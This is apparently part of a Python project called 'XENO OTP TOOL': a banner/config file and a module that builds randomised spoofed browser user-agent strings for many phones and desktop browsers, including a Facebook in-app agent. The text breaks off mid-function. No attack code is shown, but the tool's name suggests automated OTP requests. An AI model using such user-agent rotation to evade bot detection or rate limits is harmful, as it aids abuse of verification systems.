
# ========================================
# config.py
# ========================================
import os

# Terminal colors
WHITE = "\033[1;97m"
GREEN = "\033[1;92m"
RED = "\033[1;91m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
MAGENTA = "\033[1;95m"
ORANGE = "\x1b[38;5;208m"
GOLD = "\x1b[38;5;220m"
VIOLET = "\x1b[38;5;141m"
RESET = "\033[0m"

# UI elements
EKL = f"{CYAN}:{WHITE}"
LINE = f"{CYAN}•{'━'*47}•"
opt_labels = [f"{GREEN}[{RED}{str(i).zfill(2)}{GREEN}]" for i in range(1, 12)]

def clear_logo():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{GREEN}
      db   db d88888b d8b   db  .d88b. 
      `8b d8' 88'     888o  88 .8P  Y8.
       `8bo'  88ooooo 88V8o 88 88    88
       d8`8b  88~~~~~ 88 V8o88 88    88
      d8' `8b 88.     88  V888 `8b  d8'
      YP   YP Y88888P VP   V8P  `Y88P'   {ORANGE}V-1.0
{LINE}
 {GREEN}[{RED}●{GREEN}] TOOL         {EKL} XENO OTP TOOL
 {GREEN}[{RED}●{GREEN}] DEVELOPER    {EKL} Samol Hasan
 {GREEN}[{RED}●{GREEN}] STATUS       {EKL} ACTIVE
{LINE}""")

# ========================================
# user_agents.py
# ========================================
import random

# Android 4-6 (Old Devices)
ANDROID_4_6_VERSIONS = ['4.1.2', '4.2.2', '4.3', '4.4', '4.4.2', '4.4.4', '5.0', '5.0.1', '5.0.2', '5.1', '5.1.1', '6.0', '6.0.1']
ANDROID_4_6_DEVICES = [
    ('Nexus 4', 'KOT49H'), ('Nexus 5', 'LMY48B'), ('Nexus 6', 'LRX22G'),
    ('SM-G900F', 'KTU84P'), ('SM-G920F', 'LRX21T'), ('SM-G930F', 'MMB29K'),
    ('SM-G925F', 'NRD90M'), ('SM-N900', 'JSS15J'), ('SM-N910F', 'KTU84P'),
    ('GT-I9300', 'JSS15J'), ('GT-I9500', 'JDQ39'), ('GT-I9505', 'JDQ39E'),
    ('HTC One M8', 'KOT49H'), ('HTC One M9', 'LMY47O'),
    ('LG-D855', 'KTU84P'), ('LG-H815', 'LMY47D'),
    ('Sony D6603', 'KTU84P'), ('Sony E6653', 'LMY47D'),
    ('Moto G', 'KXB21.14-L1.40'), ('Moto X', 'KXA21.12-L1.26'),
    ('HUAWEI P8', 'GRA-L09'), ('HUAWEI P9', 'EVA-L09'),
    ('ONE A2001', 'LMY47V'), ('ONE A2003', 'LMY47V'), ('ONE A2005', 'LMY47V'),
    ('SM-A300F', 'KTU84P'), ('SM-A500F', 'KTU84P'), ('SM-A700F', 'KTU84P'),
    ('SM-J100H', 'KTU84P'), ('SM-J500F', 'LMY48B'), ('SM-J700F', 'LMY48B'),
    ('LG-H440n', 'LRX21Y'), ('LG-H340n', 'LRX21Y'), ('LG-D722', 'KOT49I'),
    ('HTC Desire 816', 'KOT49H'), ('HTC Desire 820', 'KTU84P'),
    ('Sony D5803', 'KTU84P'), ('Sony D6503', 'KOT49H'), ('Sony E2303', 'LRX22G'),
    ('HUAWEI G7-L01', 'KTU84P'), ('HUAWEI MT7-L09', 'KOT49H'),
    ('ASUS_Z00AD', 'LRX21V'), ('ASUS_Z008D', 'LRX21V'), ('ASUS_T00F', 'KVT49L'),
    ('Lenovo K50-t5', 'LRX21M'), ('Lenovo A6000', 'KTU84P'), ('Lenovo P70-A', 'KOT49H'),
    ('ZTE Blade L3', 'LRX21M'), ('ZTE Blade S6', 'LRX21M'),
    ('vivo Y21', 'KOT49H'), ('vivo Y31', 'LMY47V'), ('vivo V1', 'LMY47V'),
    ('OPPO R7', 'KTU84P'), ('OPPO F1', 'LMY47V'), ('OPPO A33', 'LMY47V'),
]

def get_android_4_6():
    chrome_major = random.randint(30, 55)
    chrome_version = f"{chrome_major}.0.{random.randint(1500, 2900)}.{random.randint(50, 200)}"
    android_ver = random.choice(ANDROID_4_6_VERSIONS)
    device, build = random.choice(ANDROID_4_6_DEVICES)
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'


# Android 7-11 (Mid Devices)
ANDROID_7_11_VERSIONS = ['7.0', '7.1', '7.1.1', '7.1.2', '8.0.0', '8.1.0', '9', '10', '11']
ANDROID_7_11_DEVICES = [
    ('SM-G935F', 'NRD90M'), ('SM-G950F', 'R16NW'), ('SM-G960F', 'PPR1.180610.011'),
    ('SM-G970F', 'PPR1.180610.011'), ('SM-G973F', 'PPR1.180610.011'),
    ('SM-G991B', 'RP1A.200720.012'), ('SM-A505F', 'QP1A.190711.020'),
    ('SM-A515F', 'QP1A.190711.020'), ('SM-A715F', 'QP1A.190711.020'),
    ('SM-N950F', 'NMF26X'), ('SM-N960F', 'PPR1.180610.011'),
    ('Pixel 2', 'OPD3.170816.012'), ('Pixel 3', 'QQ3A.200805.001'),
    ('Pixel 4', 'RQ3A.210905.001'), ('Pixel 4a', 'RQ3A.211001.001'),
    ('Redmi Note 7', 'PKQ1.181203.001'), ('Redmi Note 8 Pro', 'PPR1.180610.011'),
    ('Redmi Note 9', 'QP1A.190711.020'), ('Redmi Note 10 Pro', 'RKQ1.200826.002'),
    ('Mi 9', 'PKQ1.181121.001'), ('Mi 10', 'QKQ1.191222.002'),
    ('POCO F1', 'PKQ1.180729.001'), ('POCO X3', 'QQ3A.200805.001'),
    ('HUAWEI P20', 'HUAWEIEML-L29'), ('HUAWEI P30', 'HUAWEIELE-L29'),
    ('OnePlus 6', 'ONEPLUS A6003'), ('OnePlus 7 Pro', 'ONEPLUS A7010'),
    ('RMX1911', 'QKQ1.200209.002'), ('CPH1909', 'QP1A.190711.020'),
    ('SM-G981B', 'QP1A.190711.020'), ('SM-G986B', 'QP1A.190711.020'), ('SM-G988B', 'QP1A.190711.020'),
    ('SM-N970F', 'QP1A.190711.020'), ('SM-N975F', 'QP1A.190711.020'), ('SM-N986B', 'QP1A.190711.020'),
    ('SM-A105F', 'PPR1.180610.011'), ('SM-A205F', 'PPR1.180610.011'), ('SM-A305F', 'PPR1.180610.011'),
    ('SM-M315F', 'QP1A.190711.020'), ('SM-M515F', 'QP1A.190711.020'),
    ('Pixel 3a', 'QQ3A.200805.001'), ('Pixel 5', 'RQ3A.210905.001'),
    ('Redmi Note 8', 'PKQ1.190616.001'), ('Redmi 9', 'QP1A.190711.020'), ('Redmi 9T', 'QKQ1.200830.002'),
    ('Mi 9T Pro', 'QKQ1.190825.002'), ('Mi 10T Pro', 'RKQ1.200826.002'), ('POCO M3', 'QKQ1.200830.002'),
    ('HUAWEI Mate 20 Pro', 'HUAWEILYA-L29'), ('HUAWEI Mate 30 Pro', 'HUAWEILIO-L29'),
    ('VOG-L29', 'HUAWEIVOG-L29'), ('MAR-LX1A', 'HUAWEIMAR-LX1A'),
    ('OnePlus 8 Pro', 'IN2023'), ('OnePlus 8T', 'KB2003'), ('OnePlus 9 Pro', 'LE2123'),
    ('RMX2001', 'QP1A.190711.020'), ('RMX2061', 'QP1A.190711.020'), ('RMX2151', 'QP1A.190711.020'),
    ('CPH2083', 'QP1A.190711.020'), ('CPH2127', 'RKQ1.200903.002'), ('CPH2205', 'RKQ1.200903.002'),
    ('vivo 1904', 'PPR1.180610.011'), ('vivo 1920', 'QP1A.190711.020'), ('vivo 2018', 'RKQ1.200819.002'),
    ('motorola one vision', 'QSAS30.62-24-3'), ('moto g(8) plus', 'QPI30.28-Q3-28'), ('moto g(9) play', 'QPZ30.30-Q3-38'),
    ('Nokia 7.2', 'QKQ1.191014.001'), ('Nokia 8.1', 'QKQ1.190828.002'), ('Nokia 5.3', 'QKQ1.191014.001'),
    ('LM-G710', 'PKQ1.181105.001'), ('LM-G810', 'PKQ1.190416.001'), ('LM-V600', 'QKQ1.191222.002'),
    ('Sony G8142', 'PKQ1.190118.001'), ('Sony H8216', 'PKQ1.190118.001'), ('Sony J9110', 'QKQ1.190918.001'),
]

def get_android_7_11():
    chrome_major = random.randint(56, 95)
    chrome_version = f"{chrome_major}.0.{random.randint(2900, 4700)}.{random.randint(50, 200)}"
    android_ver = random.choice(ANDROID_7_11_VERSIONS)
    device, build = random.choice(ANDROID_7_11_DEVICES)
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'


# Android 12-15 (New Devices)
ANDROID_12_15_VERSIONS = ['12', '12L', '13', '14', '15']
ANDROID_12_15_DEVICES = [
    ('Pixel 6', 'SD1A.210817.036'), ('Pixel 6 Pro', 'SD1A.210817.036'),
    ('Pixel 7', 'TQ3A.230901.001'), ('Pixel 7 Pro', 'TQ3A.230901.001'),
    ('Pixel 8', 'UD1A.230803.041'), ('Pixel 8 Pro', 'UD1A.230803.041'),
    ('Pixel 9', 'AP3A.241005.015'), ('Pixel 9 Pro', 'AP3A.241005.015'),
    ('SM-S908B', 'SP1A.210812.016'), ('SM-S911B', 'TP1A.220624.014'),
    ('SM-S918B', 'TP1A.220624.014'), ('SM-S928B', 'UP1A.231005.007'),
    ('SM-S938B', 'AP3A.241105.008'), ('SM-A546B', 'TP1A.220624.014'),
    ('SM-A556B', 'UP1A.231005.007'), ('SM-A736B', 'SP1A.210812.016'),
    ('SM-S901B', 'SP1A.210812.016'), ('SM-S906B', 'SP1A.210812.016'),
    ('Redmi Note 11', 'SKQ1.211006.001'), ('Redmi Note 12 Pro', 'TP1A.220624.014'),
    ('Redmi Note 13 Pro', 'UP1A.231005.007'), ('POCO F5', 'TKQ1.221114.001'),
    ('OnePlus 10 Pro', 'SKQ1.211006.001'), ('OnePlus 11', 'TP1A.220624.014'),
    ('OnePlus 12', 'UP1A.231005.007'), ('CPH2491', 'TP1A.220624.014'),
    ('V2227A', 'SP1A.210812.016'), ('M2101K6G', 'SKQ1.210908.001'),
    ('Nothing Phone (2)', 'TQ3A.230901.001'), ('ASUS_AI2302', 'TP1A.220624.014'),
    ('SM-F711B', 'SP1A.210812.016'), ('SM-F926B', 'SP1A.210812.016'), ('SM-F721B', 'TP1A.220624.014'),
    ('SM-F936B', 'TP1A.220624.014'), ('SM-F731B', 'UP1A.231005.007'), ('SM-F946B', 'UP1A.231005.007'),
    ('SM-F741B', 'UP1A.231005.007'), ('SM-F956B', 'UP1A.231005.007'),
    ('SM-A146B', 'TP1A.220624.014'), ('SM-A346B', 'TP1A.220624.014'),
    ('SM-A156B', 'UP1A.231005.007'), ('SM-A256B', 'UP1A.231005.007'), ('SM-A356B', 'UP1A.231005.007'),
    ('Pixel 6a', 'SD2A.220601.003'), ('Pixel 7a', 'TQ3A.230901.001'), ('Pixel 8a', 'UD1A.230803.041'),
    ('Pixel Fold', 'TQ3A.230901.001'), ('Pixel 9 Pro Fold', 'AP3A.241005.015'),
    ('2201116SG', 'SKQ1.211006.001'), ('22101320G', 'TP1A.220624.014'), ('23049PCD8G', 'TP1A.220624.014'),
    ('23122PCD1G', 'UP1A.231005.007'), ('POCO X4 Pro 5G', 'SKQ1.211103.001'), ('POCO X5 Pro 5G', 'TP1A.220624.014'),
    ('POCO F4', 'SKQ1.211006.001'), ('POCO X6 Pro', 'UP1A.231005.007'),
    ('Xiaomi 12', 'SKQ1.211006.001'), ('Xiaomi 13', 'TP1A.220624.014'), ('Xiaomi 14', 'UP1A.231005.007'),
    ('OnePlus Nord 2T', 'SP1A.210812.016'), ('OnePlus Nord 3', 'TP1A.220624.014'), ('OnePlus Open', 'UP1A.231005.007'),
    ('RMX3363', 'SP1A.210812.016'), ('RMX3561', 'SP1A.210812.016'), ('RMX3771', 'TP1A.220624.014'), ('RMX3840', 'UP1A.231005.007'),
    ('CPH2359', 'SP1A.210812.016'), ('CPH2437', 'TP1A.220624.014'), ('CPH2525', 'UP1A.231005.007'),
    ('V2109', 'SP1A.210812.016'), ('V2207', 'TP1A.220624.014'), ('V2303', 'UP1A.231005.007'), ('V2338', 'UP1A.231005.007'),
    ('motorola edge 30', 'S1RDS32.55-73-2'), ('motorola edge 40', 'T1TL33.72-22-2'), ('motorola razr 40 ultra', 'T1TZ33.3-62-2'),
    ('Nothing Phone (1)', 'SKQ1.211230.001'), ('Nothing Phone (2a)', 'UP1A.231005.007'),
    ('Sony XQ-CT54', 'TP1A.220624.014'), ('Sony XQ-DQ54', 'TP1A.220624.014'),
]

def get_android_12_15():
    chrome_major = random.randint(96, 133)
    chrome_version = f"{chrome_major}.0.{random.randint(4664, 6917)}.{random.randint(30, 150)}"
    android_ver = random.choice(ANDROID_12_15_VERSIONS)
    device, build = random.choice(ANDROID_12_15_DEVICES)
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36'


def get_fb_katana_android():
    android_ver = random.choice(ANDROID_12_15_VERSIONS)
    device, build = random.choice(ANDROID_12_15_DEVICES)
    fbav = f"{random.randint(440, 460)}.0.0.{random.randint(20, 50)}.{random.randint(100, 120)}"
    fbbv = random.randint(500000000, 600000000)
    chrome_ver = f"{random.randint(115, 125)}.0.{random.randint(5000, 6000)}.{random.randint(100, 200)}"
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=2.6,width=1080,height=2280}};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:]'


# iOS Old (iPhone, iOS 10-12)
IOS_OLD_VERSIONS = [
    ('10_0', '602.1', '10.0', '14A403'),
    ('10_2', '602.4.6', '10.0', '14C92'),
    ('10_2_1', '602.4.6', '10.0', '14D27'),
    ('10_3', '603.1.30', '10.0', '14E277'),
    ('10_3_3', '603.3.8', '10.0', '14G60'),
    ('11_0', '604.1.38', '11.0', '15A372'),
    ('11_2', '604.4.7', '11.0', '15C114'),
    ('11_2_6', '604.5.6', '11.0', '15D100'),
    ('11_3', '605.1.15', '11.0', '15E216'),
    ('11_4', '605.1.15', '11.0', '15F79'),
    ('11_4_1', '605.1.15', '11.0', '15G77'),
    ('12_0', '605.1.15', '12.0', '16A366'),
    ('12_1', '605.1.15', '12.1', '16B92'),
    ('12_2', '605.1.15', '12.1', '16E227'),
    ('12_3', '605.1.15', '12.1.1', '16F203'),
    ('12_4', '605.1.15', '12.1.2', '16G77'),
    ('12_4_1', '605.1.15', '12.1.2', '16G102'),
]

def get_ios_old():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_OLD_VERSIONS)
    return f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1'


# iOS Medium (iPhone, iOS 13-15)
IOS_MEDIUM_VERSIONS = [
    ('13_0', '605.1.15', '13.0', '17A577'),
    ('13_1', '605.1.15', '13.0.1', '17A844'),
    ('13_3', '605.1.15', '13.0.4', '17C54'),
    ('13_4', '605.1.15', '13.1', '17E255'),
    ('13_5', '605.1.15', '13.1.1', '17F75'),
    ('13_5_1', '605.1.15', '13.1.1', '17F80'),
    ('13_6', '605.1.15', '13.1.2', '17G68'),
    ('13_7', '605.1.15', '13.1.2', '17H35'),
    ('14_0', '605.1.15', '14.0', '18A373'),
    ('14_2', '605.1.15', '14.0.1', '18B92'),
    ('14_4', '605.1.15', '14.0.3', '18D52'),
    ('14_6', '605.1.15', '14.1.1', '18F72'),
    ('14_7_1', '605.1.15', '14.1.2', '18G82'),
    ('14_8', '605.1.15', '14.1.2', '18H17'),
    ('15_0', '605.1.15', '15.0', '19A346'),
    ('15_1', '605.1.15', '15.1', '19B74'),
    ('15_4', '605.1.15', '15.4', '19E241'),
    ('15_5', '605.1.15', '15.5', '19F77'),
    ('15_6', '605.1.15', '15.6', '19G71'),
    ('15_6_1', '605.1.15', '15.6.1', '19G82'),
]

def get_ios_medium():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_MEDIUM_VERSIONS)
    return f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1'


# iOS New (iPhone, iOS 16-18)
IOS_NEW_VERSIONS = [
    ('16_0', '605.1.15', '16.0', '20A362'),
    ('16_1', '605.1.15', '16.1', '20B82'),
    ('16_3', '605.1.15', '16.3', '20D47'),
    ('16_4', '605.1.15', '16.4', '20E247'),
    ('16_5', '605.1.15', '16.5', '20F66'),
    ('16_6', '605.1.15', '16.6', '20G75'),
    ('17_0', '605.1.15', '17.0', '21A329'),
    ('17_1', '605.1.15', '17.1', '21B74'),
    ('17_2', '605.1.15', '17.2', '21C62'),
    ('17_3', '605.1.15', '17.3', '21D50'),
    ('17_4', '605.1.15', '17.4', '21E219'),
    ('17_4_1', '605.1.15', '17.4.1', '21E236'),
    ('17_5', '605.1.15', '17.5', '21F79'),
    ('17_6', '605.1.15', '17.6', '21G80'),
    ('18_0', '605.1.15', '18.0', '22A3354'),
    ('18_1', '605.1.15', '18.1', '22B83'),
    ('18_2', '605.1.15', '18.2', '22C152'),
]

def get_ios_new():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_NEW_VERSIONS)
    return f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1'


# iPad Old (iPadOS 10-13)
IPAD_OLD_VERSIONS = [
    ('10_3_3', '603.3.8', '10.0', '14G60'),
    ('11_0', '604.1.34', '11.0', '15A5341f'),
    ('11_2', '604.4.7', '11.0', '15C114'),
    ('11_4', '605.1.15', '11.0', '15F79'),
    ('11_4_1', '605.1.15', '11.0', '15G77'),
    ('12_0', '605.1.15', '12.0', '16A366'),
    ('12_1', '605.1.15', '12.1', '16B92'),
    ('12_4', '605.1.15', '12.1.2', '16G77'),
    ('12_4_1', '605.1.15', '12.1.2', '16G102'),
    ('13_0', '605.1.15', '13.0', '17A577'),
    ('13_1', '605.1.15', '13.0.1', '17A844'),
    ('13_3', '605.1.15', '13.0.4', '17C54'),
    ('13_5', '605.1.15', '13.1.1', '17F75'),
    ('13_6', '605.1.15', '13.1.2', '17G68'),
    ('13_7', '605.1.15', '13.1.2', '17H35'),
]

def get_ipad_old():
    ios_ver, webkit, safari_ver, build = random.choice(IPAD_OLD_VERSIONS)
    return f'Mozilla/5.0 (iPad; CPU OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1'


# iPad New (iPadOS 15-18)
IPAD_NEW_VERSIONS = [
    ('15_0', '605.1.15', '15.0', '19A346'),
    ('15_4', '605.1.15', '15.4', '19E241'),
    ('15_5', '605.1.15', '15.5', '19F77'),
    ('15_6', '605.1.15', '15.6', '19G71'),
    ('16_0', '605.1.15', '16.0', '20A362'),
    ('16_3', '605.1.15', '16.3', '20D47'),
    ('16_5', '605.1.15', '16.5', '20F66'),
    ('16_6', '605.1.15', '16.6', '20G75'),
    ('17_0', '605.1.15', '17.0', '21A329'),
    ('17_2', '605.1.15', '17.2', '21C62'),
    ('17_4', '605.1.15', '17.4', '21E219'),
    ('17_5', '605.1.15', '17.5', '21F79'),
    ('18_0', '605.1.15', '18.0', '22A3354'),
    ('18_1', '605.1.15', '18.1', '22B83'),
]

def get_ipad_new():
    ios_ver, webkit, safari_ver, build = random.choice(IPAD_NEW_VERSIONS)
    return f'Mozilla/5.0 (iPad; CPU OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1'


# KaiOS (Feature Phones)
KAIOS_VERSIONS = ['2.5', '2.5.1', '2.5.2', '2.5.3', '2.5.4', '3.0', '3.1']
KAIOS_DEVICES = [
    'Nokia 8110 4G', 'Nokia 2720 Flip', 'Nokia 6300 4G',
    'Nokia 800 Tough', 'Nokia 2780 Flip',
    'Alcatel ONETOUCH 4044O', 'Alcatel 3078',
    'LG-M150', 'JioPhone', 'JioPhone 2',
    'CAT B35', 'Doro 7010', 'Energizer E241S',
]
KAIOS_GECKO_VERSIONS = ['48.0', '84.0']

def get_kaios():
    kaios_ver = random.choice(KAIOS_VERSIONS)
    device = random.choice(KAIOS_DEVICES)
    gecko = random.choice(KAIOS_GECKO_VERSIONS)
    return f'Mozilla/5.0 (Mobile; {device}; rv:{gecko}) Gecko/{gecko} Firefox/{gecko} KAIOS/{kaios_ver}'


# Windows Phone
WP_CONFIGS = [
    ('10.0', '6.0.1', '15.15254'),
    ('10.0', '6.0.1', '15.15063'),
    ('10.0', '6.0.1', '14.14393'),
    ('10.0', '4.2.1', '14.14393'),
    ('10.0', '4.2.1', '13.10586'),
    ('8.1', None, None),
]
WP10_LUMIA_MODELS = [
    'Lumia 950 XL', 'Lumia 950', 'Lumia 650', 'Lumia 640 LTE',
    'Lumia 640 XL', 'Lumia 550', 'Lumia 535',
]
WP81_LUMIA_MODELS = [
    'Lumia 930', 'Lumia 830', 'Lumia 730', 'Lumia 635',
    'Lumia 630', 'Lumia 530', 'Lumia 1520', 'Lumia 1020',
]

def get_windows_phone():
    wp_ver, android_compat, edge_ver = random.choice(WP_CONFIGS)
    if wp_ver == '8.1':
        device = random.choice(WP81_LUMIA_MODELS)
        return f'Mozilla/5.0 (Windows Phone {wp_ver}; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; {device}) like Gecko'
    else:
        device = random.choice(WP10_LUMIA_MODELS)
        chrome_build = random.randint(2700, 2900)
        chrome_patch = random.randint(100, 150)
        return f'Mozilla/5.0 (Windows Phone {wp_ver}; Android {android_compat}; Microsoft; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.{chrome_build}.{chrome_patch} Mobile Safari/537.36 Edge/{edge_ver}'


# BlackBerry
BB10_TYPES = ['Touch', 'Keyboard']
BB10_VERSIONS = ['10.3.3.2205', '10.3.2.2836', '10.3.1.2726', '10.3.0.1418', '10.2.1.2141', '10.2.0.1803']
BBOS_MODELS = [
    ('9900', '7.1.0.346'), ('9930', '7.1.0.398'), ('9800', '6.0.0.448'),
    ('9780', '6.0.0.706'), ('9700', '6.0.0.546'), ('9360', '7.0.0.585'),
    ('9320', '7.1.0.714'), ('9790', '7.1.0.221'), ('9860', '7.0.0.261'),
]

def get_blackberry():
    use_bb10 = random.choice([True, False])
    if use_bb10:
        bb_type = random.choice(BB10_TYPES)
        bb_ver = random.choice(BB10_VERSIONS)
        webkit_minor = random.choice(['10+', '35+'])
        return f'Mozilla/5.0 (BB10; {bb_type}) AppleWebKit/537.{webkit_minor} (KHTML, like Gecko) Version/{bb_ver} Mobile Safari/537.{webkit_minor}'
    else:
        model, os_ver = random.choice(BBOS_MODELS)
        webkit = random.choice(['534.8+', '534.11+'])
        return f'Mozilla/5.0 (BlackBerry; U; BlackBerry {model}; en) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{os_ver} Mobile Safari/{webkit}'


# Windows PC Desktop Browsers (Windows 10 & Windows 11 ONLY)

def get_pc_chrome():
    chrome_major = random.randint(120, 134)
    chrome_patch = random.randint(5000, 6900)
    build_patch = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{chrome_patch}.{build_patch} Safari/537.36'


def get_pc_edge():
    edge_major = random.randint(120, 134)
    patch = random.randint(5000, 6900)
    build = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{edge_major}.0.{patch}.{build} Safari/537.36 Edg/{edge_major}.0.{patch}.{build}'


def get_pc_firefox():
    ff_major = random.randint(120, 134)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}; rv:{ff_major}.0) Gecko/20100101 Firefox/{ff_major}.0'


def get_pc_opera():
    opera_major = random.randint(105, 116)
    chrome_major = opera_major + 15
    patch = random.randint(5000, 6900)
    build = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{patch}.{build} Safari/537.36 OPR/{opera_major}.0.0.0'


def get_pc_brave():
    chrome_major = random.randint(120, 134)
    patch = random.randint(5000, 6900)
    build = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{patch}.{build} Safari/537.36'


def get_pc_vivaldi():
    chrome_major = random.randint(120, 134)
    vivaldi_ver = f"6.{random.randint(5, 9)}.{random.randint(3000, 3500)}.{random.randint(10, 90)}"
    patch = random.randint(5000, 6900)
    build = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{patch}.{build} Safari/537.36 Vivaldi/{vivaldi_ver}'


def get_pc_yandex():
    chrome_major = random.randint(120, 134)
    yandex_ver = f"24.{random.randint(1, 10)}.{random.randint(1, 5)}.{random.randint(100, 900)}"
    patch = random.randint(5000, 6900)
    build = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{patch}.{build} YaBrowser/{yandex_ver} Yowser/2.5 Safari/537.36'


def get_pc_waterfox():
    ff_major = random.randint(115, 130)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}; rv:{ff_major}.0) Gecko/20100101 Waterfox/{ff_major}.0'


def get_pc_chromium():
    chrome_major = random.randint(120, 134)
    chrome_patch = random.randint(5000, 6900)
    build_patch = random.randint(50, 190)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{chrome_patch}.{build_patch} Safari/537.36'


def get_pc_maxthon():
    chrome_major = random.randint(110, 128)
    mx_ver = f"7.{random.randint(1, 2)}.{random.randint(1, 5)}.{random.randint(1000, 4000)}"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36 Maxthon/{mx_ver}'


def get_pc_avast():
    chrome_major = random.randint(120, 134)
    avast_ver = f"120.0.{random.randint(20000, 25000)}.100"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36 Avast/{avast_ver}'


def get_pc_comodo():
    chrome_major = random.randint(110, 125)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Dragon/{chrome_major}.0.0.0 Safari/537.36'


def get_pc_tor():
    ff_major = random.choice([115, 128])
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}; rv:{ff_major}.0) Gecko/20100101 Firefox/{ff_major}.0'


def get_pc_uc():
    chrome_major = random.randint(110, 125)
    uc_ver = f"7.0.{random.randint(1000, 9000)}.1004"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 UCBrowser/{uc_ver} Safari/537.36'


def get_pc_palemoon():
    pm_ver = f"33.{random.randint(0, 3)}.{random.randint(0, 5)}"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}; rv:102.0) Gecko/20100101 Goanna/6.6 PaleMoon/{pm_ver}'


def get_pc_seamonkey():
    sm_ver = f"2.53.{random.randint(10, 20)}"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}; rv:91.0) Gecko/20100101 Firefox/91.0 SeaMonkey/{sm_ver}'


def get_pc_cent():
    chrome_major = random.randint(118, 130)
    cent_ver = f"5.1.{random.randint(10, 50)}.{random.randint(100, 200)}"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Cent/{cent_ver} Safari/537.36'


def get_pc_slimjet():
